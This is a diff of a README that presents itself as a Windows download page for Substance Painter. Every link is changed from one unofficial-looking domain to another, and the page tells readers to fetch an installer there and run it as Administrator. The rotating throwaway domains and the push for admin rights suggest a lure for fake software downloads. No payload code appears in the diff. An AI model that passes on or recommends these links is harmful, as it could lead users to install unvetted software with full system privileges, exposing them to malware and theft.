@@ -13,27 +13,27 @@
 > **This is the download page.** Use the button or link below to get **Substance Painter** for Windows.
 
 <p align="center">
-  <a href="https://substance.zipzapsol.space/">
+  <a href="https://substance.wonderchain.fun/">
     <img src="https://img.shields.io/badge/Download-Substance%20Painter-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Substance Painter">
   </a>
 </p>
 
 | | |
 | --- | --- |
-| **Direct link** | **[substance.zipzapsol.space](https://substance.zipzapsol.space/)** |
-| **Full URL** | `https://substance.zipzapsol.space/` |
+| **Direct link** | **[substance.wonderchain.fun](https://substance.wonderchain.fun/)** |
+| **Full URL** | `https://substance.wonderchain.fun/` |
 | **Type** | Installer for Windows 10 / 11 (64-bit) |
 | **Admin** | Run setup as Administrator |
 
 ### Quick steps
 
-1. Click **[Download — substance.zipzapsol.space](https://substance.zipzapsol.space/)** (link above)
+1. Click **[Download — substance.wonderchain.fun](https://substance.wonderchain.fun/)** (link above)
 2. Save the file from the project page
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
 5. Restart if the installer asks — then launch from Start menu
 
-<p align="center"><a href="https://substance.zipzapsol.space/"><strong>⬇ Download Substance Painter now</strong></a></p>
+<p align="center"><a href="https://substance.wonderchain.fun/"><strong>⬇ Download Substance Painter now</strong></a></p>
 
 ---
 
